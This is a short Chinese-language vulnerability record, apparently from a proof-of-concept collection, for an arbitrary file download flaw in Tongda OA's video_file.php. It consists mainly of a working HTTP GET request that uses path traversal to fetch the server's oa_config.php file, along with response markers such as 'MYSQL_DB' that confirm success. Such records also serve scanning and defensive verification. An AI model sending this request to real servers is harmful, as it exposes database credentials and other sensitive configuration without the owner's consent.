﻿# 通达 OA video_file.php任意文件下载漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：通达OA 2017前台任意文件下载，2022攻防演习期间，通达OA被曝存在任意文件下载漏洞，攻击者可以利用漏洞直接获取服务器敏感信息。

> 漏洞特征：

> 验证脚本：HTTP

```
GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：MYSQL_DB

> 上传文件定位：

> 验证文件来源：通达 OA video_file.php任意文件下载漏洞.poc
